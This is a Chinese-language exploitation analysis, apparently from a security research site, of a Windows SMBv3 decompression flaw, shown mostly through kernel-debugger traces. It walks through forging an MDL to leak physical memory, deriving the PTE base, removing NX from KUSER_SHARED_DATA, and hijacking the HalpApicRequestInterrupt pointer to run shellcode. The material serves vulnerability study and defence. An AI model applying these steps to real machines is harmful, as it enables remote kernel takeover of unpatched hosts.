ffffcc0f`76fed180  ffffcc0f`76fe9000 ffffcc0f`76fed1e0
ffffcc0f`76fed190  00000000`00000000 00000000`00000000
ffffcc0f`76fed1a0  ffffcc0f`76fed240 00000000`00000000
ffffcc0f`76fed1b0  00000000`00000000 00000000`00000000
ffffcc0f`76fed1c0  00000000`00000000 00000000`00000000

```

通过 MmSizeOfMdl 函数获取 MDL 结构长度，以下为获取 0x41e8 长度空间所需的 MDL 结构长度 (0x58)，其中，0x30 为基础长度，0x28 存放 5 个物理页的 pfn（0x41e8 长度的数据需要存放在 5 个页）。

```
kd> 
srvnet!SrvNetAllocateBufferFromPool+0x62:
fffff806`2280d2d2 e809120101      call    nt!MmSizeOfMdl (fffff806`2381e4e0)
kd> r rcx
rcx=0000000000000000
kd> r rdx     //0x4100 + 0xe8
rdx=00000000000041e8
kd> p
srvnet!SrvNetAllocateBufferFromPool+0x67:
fffff806`2280d2d7 488d6808        lea     rbp,[rax+8]
kd> r rax    //0x30+0x28
rax=0000000000000058
kd> dt _mdl
nt!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B

```

MmBuildMdlForNonPagedPool 函数调用后，MdlFlags 被设置为 4，且对应的物理页 pfn 被写入 MDL 结构，_然后通过 MmMdlPageContentsState 函数以及或操作将 MdlFlags 设置为 0x5004（20484）。_

```
kd> 
srvnet!SrvNetAllocateBufferFromPool+0x1b0:
fffff806`2280d420 e8eb220301      call    nt!MmBuildMdlForNonPagedPool (fffff806`2383f710)

kd> dt _mdl @rcx
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n88
   +0x00a MdlFlags         : 0n0
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : (null) 
   +0x020 StartVa          : 0xffffcc0f`76fe9000 Void
   +0x028 ByteCount        : 0x4100
   +0x02c ByteOffset       : 0x50

kd> dd rcx
ffffcc0f`76fed1e0  00000000 00000000 00000058 00000000
ffffcc0f`76fed1f0  00000000 00000000 00000000 00000000
ffffcc0f`76fed200  76fe9000 ffffcc0f 00004100 00000050
ffffcc0f`76fed210  00000000 00000000 00000000 00000000
ffffcc0f`76fed220  00000000 00000000 00000000 00000000
ffffcc0f`76fed230  00000000 00000000 00000000 00000000
ffffcc0f`76fed240  00000000 00000000 00000000 00000000
ffffcc0f`76fed250  00000000 00000000 00000000 00000000

//flag以及物理页pfn被设置
kd> p
srvnet!SrvNetAllocateBufferFromPool+0x1b5:
fffff806`2280d425 488b4f38        mov     rcx,qword ptr [rdi+38h]
kd> dt _mdl ffffcc0f`76fed1e0
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n88
   +0x00a MdlFlags         : 0n4
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : 0xffffcc0f`76fe9050 Void
   +0x020 StartVa          : 0xffffcc0f`76fe9000 Void
   +0x028 ByteCount        : 0x4100
   +0x02c ByteOffset       : 0x50
kd> dd ffffcc0f`76fed1e0
ffffcc0f`76fed1e0  00000000 00000000 00040058 00000000
ffffcc0f`76fed1f0  00000000 00000000 76fe9050 ffffcc0f
ffffcc0f`76fed200  76fe9000 ffffcc0f 00004100 00000050
ffffcc0f`76fed210  00041099 00000000 00037d1a 00000000
ffffcc0f`76fed220  00037d9b 00000000 00039c9c 00000000
ffffcc0f`76fed230  00037d1d 00000000 00000000 00000000
ffffcc0f`76fed240  00000000 00000000 00000000 00000000
ffffcc0f`76fed250  00000000 00000000 00000000 00000000

//是正确的物理页
kd> dd ffffcc0f`76fe9000
ffffcc0f`76fe9000  00000000 00000000 00000000 00000000
ffffcc0f`76fe9010  76fe9070 ffffcc0f 00000001 00000000
ffffcc0f`76fe9020  00000001 00000001 76fe9088 ffffcc0f
ffffcc0f`76fe9030  00000008 00000000 00000000 00000000
ffffcc0f`76fe9040  00000000 00000000 76fe90f8 ffffcc0f
ffffcc0f`76fe9050  00000290 00000000 76feb4d8 ffffcc0f
ffffcc0f`76fe9060  00000238 00000000 0000000c 00000000
ffffcc0f`76fe9070  00000018 00000001 eb004a11 11d49b1a
kd> !dd 41099000
#41099000   00000000 00000000 00000000 00000000
#41099010   76fe9070 ffffcc0f 00000001 00000000
#41099020   00000001 00000001 76fe9088 ffffcc0f
#41099030   00000008 00000000 00000000 00000000
#41099040   00000000 00000000 76fe90f8 ffffcc0f
#41099050   00000290 00000000 76feb4d8 ffffcc0f
#41099060   00000238 00000000 0000000c 00000000
#41099070   00000018 00000001 eb004a11 11d49b1a

```

### 物理地址读

根据前面的介绍可知，SRVNET BUFFER HDR 结构体中存放了两个 MDL 结构（Memory Descriptor List，内存描述符列表）指针，分别位于其 0x38 和 0x50 偏移处，MDL 维护缓冲区的物理地址信息，以下为某个请求结构的第一个 MDL：

```
2: kd> dt _mdl poi(rax+38)
nt!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n64
   +0x00a MdlFlags         : 0n20484
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : 0xffffae8d`0cfe3050 Void
   +0x020 StartVa          : 0xffffae8d`0cfe3000 Void
   +0x028 ByteCount        : 0x1100
   +0x02c ByteOffset       : 0x50

2: kd> dd poi(rax+38)
ffffae8d`0cfe41e0  00000000 00000000 50040040 00000000
ffffae8d`0cfe41f0  00000000 00000000 0cfe3050 ffffae8d
ffffae8d`0cfe4200  0cfe3000 ffffae8d 00001100 00000050
ffffae8d`0cfe4210  0004a847 00000000 00006976 00000000
ffffae8d`0cfe4220  00000000 00000000 00000000 00000000
ffffae8d`0cfe4230  00040040 00000000 00000000 00000000
ffffae8d`0cfe4240  00000000 00000000 0cfe3000 ffffae8d
ffffae8d`0cfe4250  00001100 00000050 00000000 00000000

```

0xFFFFAE8D0CFE3000 映射自物理页 4A847 ，0xFFFFAE8D0CFE4000 映射自物理页 6976。和上面 MDL 结构可以对应起来。

```
3: kd> !pte 0xffffae8d`0cfe3000
                                           VA ffffae8d0cfe3000
PXE at FFFFF6FB7DBEDAE8    PPE at FFFFF6FB7DB5D1A0    PDE at FFFFF6FB6BA34338    PTE at FFFFF6D746867F18
contains 0A000000013BE863  contains 0A000000013C1863  contains 0A00000020583863  contains 8A0000004A847B63
pfn 13be      ---DA--KWEV  pfn 13c1      ---DA--KWEV  pfn 20583     ---DA--KWEV  pfn 4a847     CG-DA--KW-V

3: kd> !pte 0xffffae8d`0cfe4000
                                           VA ffffae8d0cfe4000
PXE at FFFFF6FB7DBEDAE8    PPE at FFFFF6FB7DB5D1A0    PDE at FFFFF6FB6BA34338    PTE at FFFFF6D746867F20
contains 0A000000013BE863  contains 0A000000013C1863  contains 0A00000020583863  contains 8A00000006976B63
pfn 13be      ---DA--KWEV  pfn 13c1      ---DA--KWEV  pfn 20583     ---DA--KWEV  pfn 6976      CG-DA--KW-V

```

在 Srv2DecompressData 函数中，如果解压失败，就会调用 SrvNetFreeBuffer，在这个函数中对不需要的缓冲区进行一些处理之后将其放回 SrvNetBufferLookasides 表，但没有对 User Buffer 区域以及 MDL 相关数据进行处理，后面再用到的时候会直接取出来用（前面分析过），存在数据未初始化的隐患。如下所示，在 nt!ExpInterlockedPushEntrySList 函数被调用后，伪造了 pMDL1 指针的 SRVNET BUFFER HDR 结构体指针被放入 SrvNetBufferLookasides。

```
//Srv2DecompressData
    NTSTATUS Status = SmbCompressionDecompress(
        Header->CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header->Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header->Offset),
        (PUCHAR)Alloc->UserBuffer + Header->Offset,
        Header->OriginalCompressedSegmentSize,
        &FinalCompressedSize);
    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }

3: kd> dq poi(poi(SrvNetBufferLookasides)+20)
ffffae8d`0bbb54c0  ffffae8d`0bbddbc0 ffffae8d`0bbdd980
ffffae8d`0bbb54d0  ffffae8d`0bbdd7c0 ffffae8d`0bbdd640
ffffae8d`0bbb54e0  ffffae8d`0bbdd140 0005d2a7`00000014
ffffae8d`0bbb54f0  0002974b`0003d3e0 00000064`00005000
ffffae8d`0bbb5500  52777445`0208f200 0006f408`0006f3f3
ffffae8d`0bbb5510  ffffae8d`0586bb58 ffffae8d`0bbb5f10
ffffae8d`0bbb5520  ffffae8d`0bbb5520 ffffae8d`0bbb5520
ffffae8d`0bbb5530  ffffae8d`0586bb20 00000000`00000000

3: kd> p
srvnet!SrvNetFreeBuffer+0x18b:
fffff800`494758ab ebcf            jmp     srvnet!SrvNetFreeBuffer+0x15c (fffff800`4947587c)

3: kd> dq ffffae8d`0bbdd140
ffffae8d`0bbdd140  00000000`00130002 ffffae8d`0dbf6150
ffffae8d`0bbdd150  0000001a`01000004 00000013`0000000d
ffffae8d`0bbdd160  00000200`00000000 00001100`3030534c
ffffae8d`0bbdd170  fffff800`4947d600 fffff800`4947d590
ffffae8d`0bbdd180  ffffae8d`0bbdd9c0 ffffae8d`08302ac0
ffffae8d`0bbdd190  00000009`00000016 00000000`00000000
ffffae8d`0bbdd1a0  ffffae8d`0bbddbc0 00000000`00000000
ffffae8d`0bbdd1b0  00000000`00000001 00000000`00000000

3: kd> dq ffffae8d`0dbf6150    //假设伪造了pmdl1指针
ffffae8d`0dbf6150  ffffae8d`0a771150 cdcdcdcd`cdcdcdcd
ffffae8d`0dbf6160  00000003`00000000 ffffae8d`0dbf5050
ffffae8d`0dbf6170  00000000`00001100 00000000`00001278
ffffae8d`0dbf6180  ffffae8d`0dbf5000 fffff780`00000e00
ffffae8d`0dbf6190  00000000`00000000 00000000`00000000
ffffae8d`0dbf61a0  ffffae8d`0dbf6228 00000000`00000000
ffffae8d`0dbf61b0  00000000`00000000 00000000`00000000
ffffae8d`0dbf61c0  00000000`00000000 00000000`00000000

```

ricercasecurity 文章中提示可通过伪造 MDL 结构（设置后面的物理页 pfn）来泄露物理内存。在后续处理某些请求时，会从 SrvNetBufferLookasides 表中取出缓冲区来存放数据，因而数据包有概率分配在被破坏的缓冲区上，由于网卡驱动最终会依赖 DMA（Direct Memory Access，直接内存访问）来传输数据包，因而伪造的 MDL 结构可控制读取有限的数据。如下所示，Smb2ExecuteNegotiateReal 函数在处理 SMB 协商的过程中又从 SrvNetBufferLookasides 中获取到了被破坏的缓冲区，其 pMDL1 指针已经被覆盖为伪造的 MDL 结构地址 0xfffff78000000e00，该结构偏移 0x30 处的物理页被指定为 0x1aa。

```
3: kd> dd fffff78000000e00    //伪造的MDL结构
fffff780`00000e00  00000000 00000000 50040040 0b470280
fffff780`00000e10  00000000 00000000 00000050 fffff780
fffff780`00000e20  00000000 fffff780 00001100 00000008
fffff780`00000e30  000001aa 00000000 00000001 00000000

3: kd> k
 # Child-SP          RetAddr               Call Site
00 ffffd700`634cf870 fffff800`494767de     nt!ExpInterlockedPopEntrySListResume+0x7
01 ffffd700`634cf880 fffff800`44d24de6     srvnet!SrvNetAllocateBuffer+0x9e
02 ffffd700`634cf8d0 fffff800`44d3d584     srv2!Srv2AllocateResponseBuffer+0x1e
03 ffffd700`634cf900 fffff800`44d29a9f     srv2!Smb2ExecuteNegotiateReal+0x185f4
04 ffffd700`634cfad0 fffff800`44d2989a     srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
05 ffffd700`634cfb50 fffff800`457d9037     srv2!RfspThreadPoolNodeWorkerRun+0x1ba
06 ffffd700`634cfbb0 fffff800`45128ce5     nt!IopThreadStart+0x37
07 ffffd700`634cfc10 fffff800`452869ca     nt!PspSystemThreadStartup+0x55
08 ffffd700`634cfc60 00000000`00000000     nt!KiStartSystemThread+0x2a

3: kd> 
srv2!Smb2ExecuteNegotiateReal+0x592:
fffff800`44d25522 498b86f8000000  mov     rax,qword ptr [r14+0F8h]
3: kd> 
srv2!Smb2ExecuteNegotiateReal+0x599:
fffff800`44d25529 488b5818        mov     rbx,qword ptr [rax+18h]
3: kd> dd rax    //被破坏了的pmdl1指针
ffffae8d`0cfce150  00000000 00000000 005c0073 00750050
ffffae8d`0cfce160  00000002 00000003 0cfcd050 ffffae8d
ffffae8d`0cfce170  00001100 000000c4 00001278 00650076
ffffae8d`0cfce180  0cfcd000 ffffae8d 00000e00 fffff780
ffffae8d`0cfce190  00000000 006f0052 00000000 00000000
ffffae8d`0cfce1a0  0cfce228 ffffae8d 00000000 00000000
ffffae8d`0cfce1b0  00000000 00450054 0050004d 0043003d
ffffae8d`0cfce1c0  005c003a 00730055 00720065 005c0073

```

在后续数据传输过程中会调用 hal!HalBuildScatterGatherListV2 函数，其会利用 MDL 结构中的 PFN、ByteOffset 以及 ByteCount 来设置_SCATTER_GATHER_ELEMENT 结构。然后调用 TRANSMIT::MiniportProcessSGList 函数（位于 e1i65x64.sys，网卡驱动，测试环境）直接传送数据，该函数第三个参数为_SCATTER_GATHER_LIST 类型，其两个 _SCATTER_GATHER_ELEMENT 结构分别指明了 0x3d942c0 和 0x1aa008 （物理地址），如下所示，当函数执行完成后，0x1aa 物理页的部分数据被泄露。其中，0x1aa008 来自于伪造的 MDL 结构，计算过程为：(0x1aa << c) + 8。

```
1: kd> dd r8
ffffae8d`0b454ca0  00000002 ffffae8d 00000001 00000000
ffffae8d`0b454cb0  03d942c0 00000000 00000100 ffffae8d
ffffae8d`0b454cc0  00000000 00000260 001aa008 00000000
ffffae8d`0b454cd0  00000206 00000000 00640064 00730069

1: kd> dt _SCATTER_GATHER_LIST @r8
hal!_SCATTER_GATHER_LIST
   +0x000 NumberOfElements : 2
   +0x008 Reserved         : 1
   +0x010 Elements         : [0] _SCATTER_GATHER_ELEMENT

1: kd> dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0
hal!_SCATTER_GATHER_ELEMENT
   +0x000 Address          : _LARGE_INTEGER 0x3d942c0
   +0x008 Length           : 0x100
   +0x010 Reserved         : 0x00000260`00000000
1: kd> dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0+18
hal!_SCATTER_GATHER_ELEMENT
   +0x000 Address          : _LARGE_INTEGER 0x1aa008
   +0x008 Length           : 0x206
   +0x010 Reserved         : 0x00730069`00640064

```

```
1: kd> !db 0x3d9438a l100
# 3d9438a 00 50 56 c0 00 08 00 0c-29 c9 e3 5d 08 00 45 00 .PV.....)..]..E.
# 3d9439a 02 2e 45 8c 00 00 80 06-00 00 c0 a8 8c 8a c0 a8 ..E.............
# 3d943aa 8c 01 01 bd df c4 e1 1c-22 7e c3 d1 b7 0d 50 18 ........"~....P.
# 3d943ba 20 14 9b fd 00 00 c3 d1-b7 0d 00 00 00 00 00 00  ...............

1: kd> !dd 0x1aa008
#  1aa008 00000000 00000000 00000000 00000000
#  1aa018 00000000 00000000 00000000 00000000
#  1aa028 00000000 00000000 00000000 00000000
#  1aa038 00000000 00000000 00000000 00000000
#  1aa048 00000000 00000000 00000000 00000000
#  1aa058 00000000 00000000 00000000 00000000
#  1aa068 00000000 00000000 00000000 00000000
#  1aa078 00000000 00000000 00000000 00000000

```

![](https://images.seebug.org/content/images/2020/09/24/1600927618000-9ryhid.png-w331s)

正常的响应包应该是以下这个样子的，这次通过查看 MiniportProcessSGList 函数第四个参数（_NET_BUFFER 类型）来验证，如下所示，此次 MDL 结构中维护的物理地址（0x4a84704c）和线性地址（0xffffae8d0cfe304c）是一致的：

```
3: kd> dt _NET_BUFFER @r9
ndis!_NET_BUFFER
   +0x000 Next             : (null) 
   +0x008 CurrentMdl       : 0xffffae8d`0ca6ac50 _MDL
   +0x010 CurrentMdlOffset : 0xca
   +0x018 DataLength       : 0x23c
   +0x018 stDataLength     : 0x00010251`0000023c
   +0x020 MdlChain         : 0xffffae8d`0ca6ac50 _MDL
   +0x028 DataOffset       : 0xca
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferHeader  : _NET_BUFFER_HEADER
   +0x030 ChecksumBias     : 0
   +0x032 Reserved         : 5
   +0x038 NdisPoolHandle   : 0xffffae8d`08304900 Void
   +0x040 NdisReserved     : [2] 0xffffae8d`0c2e19a0 Void
   +0x050 ProtocolReserved : [6] 0x00000206`00000100 Void
   +0x080 MiniportReserved : [4] (null) 
   +0x0a0 DataPhysicalAddress : _LARGE_INTEGER 0xff0201cb`ff0201cd
   +0x0a8 SharedMemoryInfo : (null) 
   +0x0a8 ScatterGatherList : (null) 

3: kd> dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0ca6ac50)
((ndis!_MDL *)0xffffae8d0ca6ac50)                 : 0xffffae8d0ca6ac50 [Type: _MDL *]
    [+0x000] Next             : 0xffffae8d0850d690 [Type: _MDL *]
    [+0x008] Size             : 56 [Type: short]
    [+0x00a] MdlFlags         : 4 [Type: short]
    [+0x00c] AllocationProcessorNumber : 0x2e7 [Type: unsigned short]
    [+0x00e] Reserved         : 0xff02 [Type: unsigned short]
    [+0x010] Process          : 0x0 [Type: _EPROCESS *]
    [+0x018] MappedSystemVa   : 0xffffae8d0ca6ac90 [Type: void *]
    [+0x020] StartVa          : 0xffffae8d0ca6a000 [Type: void *]
    [+0x028] ByteCount        : 0x100 [Type: unsigned long]
    [+0x02c] ByteOffset       : 0xc90 [Type: unsigned long]

3: kd> dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0850d690)
((ndis!_MDL *)0xffffae8d0850d690)                 : 0xffffae8d0850d690 [Type: _MDL *]
    [+0x000] Next             : 0x0 [Type: _MDL *]
    [+0x008] Size             : 56 [Type: short]
    [+0x00a] MdlFlags         : 16412 [Type: short]
    [+0x00c] AllocationProcessorNumber : 0x3 [Type: unsigned short]
    [+0x00e] Reserved         : 0x0 [Type: unsigned short]
    [+0x010] Process          : 0x0 [Type: _EPROCESS *]
    [+0x018] MappedSystemVa   : 0xffffae8d0cfe304c [Type: void *]
    [+0x020] StartVa          : 0xffffae8d0cfe3000 [Type: void *]
    [+0x028] ByteCount        : 0x206 [Type: unsigned long]
    [+0x02c] ByteOffset       : 0x4c [Type: unsigned long]

3: kd> db 0xffffae8d0cfe304c
ffffae8d`0cfe304c  00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00  .....SMB@.......
ffffae8d`0cfe305c  00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe306c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe307c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffae8d`0cfe308c  00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05  ....A.......f4..
ffffae8d`0cfe309c  30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00  0..I.H.xG..8/...
ffffae8d`0cfe30ac  00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89  .............k..
ffffae8d`0cfe30bc  4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01  K.............@.

3: kd> !db 0x4a84704c
#4a84704c 00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00 .....SMB@.......
#4a84705c 00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84706c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84707c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#4a84708c 00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05 ....A.......f4..
#4a84709c 30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00 0..I.H.xG..8/...
#4a8470ac 00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89 .............k..
#4a8470bc 4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01 K.............@.

```

![](https://images.seebug.org/content/images/2020/09/24/1600927619000-10cjqzx.png-w331s)

### 漏洞利用流程

1. 通过任意地址写伪造 MDL 结构

2. 利用解压缩精准覆盖 pMDL1 指针，使得压缩数据正好可以解压出伪造的 MDL 结构地址，但要控制解压失败，避免不必要的后续复制操作覆盖掉重要数据

3. 利用前两步读取 1aa（1ad）页，寻找自索引值，根据这个值计算 PTE base

4. 根据 PTE BASE 和 KUSER_SHARED_DATA 的虚拟地址计算出该地址的 PTE，修改 KUSER_SHARED_DATA 区域的可执行权限

5. 将 Shellcode 通过任意地址写复制到 0xfffff78000000800（属于 KUSER_SHARED_DATA）

6. 获取 halpInterruptController 指针以及 hal!HalpApicRequestInterrupt 指针，利用任意地址写将 hal!HalpApicRequestInterrupt 指针覆盖为 Shellcode 地址，将 halpInterruptController 指针复制到已知区域（以便 Shellcode 可以找到 hal!HalpApicRequestInterrupt 函数地址并将 halpInterruptController 偏移 0x78 处的该函数指针还原）。hal!HalpApicRequestInterrupt 函数是系统一直会调用的函数，劫持了它就等于劫持了系统执行流程。

**计算 PTE BASE：** 使用物理地址读泄露 1aa 页的数据（测试虚拟机采用 BIOS 引导），找到其自索引，通过 (index << 39) | 0xFFFF000000000000 得到 PTE BASE。如下例所示：1aa 页自索引为 479（0x1DF），因而 PTE BASE 为 (0x1DF << 39) | 0xFFFF000000000000 = 0xFFFFEF8000000000。

```
0: kd> !dq 1aa000 l1df+1
#  1aa000 8a000000`0de64867 00000000`00000000
#  1aa010 00000000`00000000 00000000`00000000
#  1aa020 00000000`00000000 00000000`00000000
#  ......
#  1aaed0 0a000000`013b3863 00000000`00000000
#  1aaee0 00000000`00000000 00000000`00000000
#  1aaef0 00000000`00000000 80000000`001aa063

1: kd> ?(0x1DF << 27) | 0xFFFF000000000000
Evaluate expression: -18141941858304 = ffffef80`00000000

```

**计算 KUSER_SHARED_DATA 的 PTE：** 通过 PTE BASE 和 KUSER_SHARED_DATA 的 VA 可以算出 KUSER_SHARED_DATA 的 PTE，2017 年黑客大会的一篇 PDF 里有介绍。计算过程实际是来源于 ntoskrnl.exe 中的 MiGetPteAddress 函数，如下所示，其中 0xFFFFF68000000000 为未随机化时的 PTE BASE，但自 Windows 10 1607 起 PTE BASE 被随机化，不过幸运的是，这个值可以从 MiGetPteAddress 函数偏移 0x13 处获取，系统运行后会将随机化的基址填充到此处（后面一种思路用了这个）：

```
.text:00000001400F1D28 MiGetPteAddress proc near               ; CODE XREF: MmInvalidateDumpAddresses+1B↓p
.text:00000001400F1D28                                         ; MiResidentPagesForSpan+1B↓p ...
.text:00000001400F1D28                 shr     rcx, 9
.text:00000001400F1D2C                 mov     rax, 7FFFFFFFF8h
.text:00000001400F1D36                 and     rcx, rax
.text:00000001400F1D39                 mov     rax, 0FFFFF68000000000h
.text:00000001400F1D43                 add     rax, rcx
.text:00000001400F1D46                 retn
.text:00000001400F1D46 MiGetPteAddress endp

1: kd> u MiGetPteAddress
nt!MiGetPteAddress:
fffff802`045add28 48c1e909        shr     rcx,9
fffff802`045add2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
fffff802`045add36 4823c8          and     rcx,rax
fffff802`045add39 48b80000000080efffff mov rax,0FFFFEF8000000000h
fffff802`045add43 4803c1          add     rax,rcx
fffff802`045add46 c3              ret
fffff802`045add47 cc              int     3
fffff802`045add48 cc              int     3

```

在获取了 PTE BASE 之后可按照以上流程计算某地址的 PTE，按照上面的代码计算 FFFFF7800000000（KUSER_SHARED_DATA 的起始地址）的 PTE 为：((FFFFF78000000000>> 9 ) & 7FFFFFFFF8) + 0xFFFFEF8000000000 = 0xFFFFEFFBC0000000，对比如下输出可知，我们已经成功计算出了 FFFFF7800000000 对应的 PTE。

```
0: kd> !pte fffff78000000000
                                           VA fffff78000000000
PXE at FFFFEFF7FBFDFF78    PPE at FFFFEFF7FBFEF000    PDE at FFFFEFF7FDE00000    PTE at FFFFEFFBC0000000
contains 0000000001300063  contains 0000000001281063  contains 0000000001782063  contains 00000000013B2963
pfn 1300      ---DA--KWEV  pfn 1281      ---DA--KWEV  pfn 1782      ---DA--KWEV  pfn 13b2      -G-DA--KWEV

```

PDF 链接：[https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf)

**去 NX 标志位：** 知道了目标地址的 PTE（ 0xFFFFEFFBC0000000），就可以为其去掉 NX 标志，这样就可以在这个区域执行代码了，思路是利用任意地址写将 PTE 指向的地址的 NoExecute 标志位修改为 0。

```
2: kd> db ffffeffb`c0000006
ffffeffb`c0000006  00 80 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

0: kd> db FFFFEFFBC0000000+6    //修改后
ffffeffb`c0000006  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```

```
1: kd> dt _MMPTE_HARDWARE FFFFEFFBC0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y1

0: kd> dt _MMPTE_HARDWARE FFFFEFFBC0000000    //修改后
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y0

```

**寻找 HAL：** HAL 堆是在 HAL.DLL 引导过程中创建的，HAL 堆上存放了 HalpInterruptController（目前也是随机化的），其中保存了一些函数指针，其偏移 0x78 处存放了 hal!HalpApicRequestInterrupt 函数指针。这个函数和中断相关，会被系统一直调用，所以可通过覆盖这个指针劫持执行流程。

```
0: kd> dq poi(hal!HalpInterruptController)
fffff7e6`80000698  fffff7e6`800008f0 fffff802`04486e50
fffff7e6`800006a8  fffff7e6`800007f0 00000000`00000030
fffff7e6`800006b8  fffff802`04422d80 fffff802`04421b90
fffff7e6`800006c8  fffff802`04422520 fffff802`044226e0
fffff7e6`800006d8  fffff802`044226b0 00000000`00000000
fffff7e6`800006e8  fffff802`044223c0 00000000`00000000
fffff7e6`800006f8  fffff802`04454560 fffff802`04432770
fffff7e6`80000708  fffff802`04421890 fffff802`0441abb0

0: kd> u fffff802`0441abb0
hal!HalpApicRequestInterrupt:
fffff802`0441abb0 48896c2420      mov     qword ptr [rsp+20h],rbp
fffff802`0441abb5 56              push    rsi
fffff802`0441abb6 4154            push    r12
fffff802`0441abb8 4156            push    r14
fffff802`0441abba 4883ec40        sub     rsp,40h
fffff802`0441abbe 488bb42480000000 mov     rsi,qword ptr [rsp+80h]
fffff802`0441abc6 33c0            xor     eax,eax
fffff802`0441abc8 4532e4          xor     r12b,r12b

```

可通过遍历物理页找到 HalpInterruptController 地址，如下所示，在虚拟机调试环境下该地址位于第一个物理页。在获得这个地址后，可通过 0x78 偏移找到 alpApicRequestInterrupt 函数指针地址，覆盖这个地址为 Shellcode 地址 0xfffff78000000800，等待劫持执行流程。

```
1: kd> !dq 1000
#    1000 00000000`00000000 00000000`00000000
#    1010 00000000`01010600 00000000`00000000
#    ......
#    18f0 fffff7e6`80000b20 fffff7e6`80000698
#    1900 fffff7e6`80000a48 00000000`00000004

```

**Shellcode 复制 && 执行：** 通过任意地址写将 Shellcode 复制到 0xfffff78000000800，等待 “alpApicRequestInterrupt 函数” 被调用。

```
0: kd> g
Breakpoint 0 hit
fffff780`00000800 55              push    rbp

0: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff800`482b24c8 fffff800`450273a0     0xfffff780`00000800
01 fffff800`482b24d0 fffff800`4536c4b8     hal!HalSendNMI+0x330
02 fffff800`482b2670 fffff800`4536bbee     nt!KiSendFreeze+0xb0
03 fffff800`482b26d0 fffff800`45a136ac     nt!KeFreezeExecution+0x20e
04 fffff800`482b2800 fffff800`45360811     nt!KdEnterDebugger+0x64
05 fffff800`482b2830 fffff800`45a17105     nt!KdpReport+0x71
06 fffff800`482b2870 fffff800`451bbbf0     nt!KdpTrap+0x14d
07 fffff800`482b28c0 fffff800`451bb85f     nt!KdTrap+0x2c
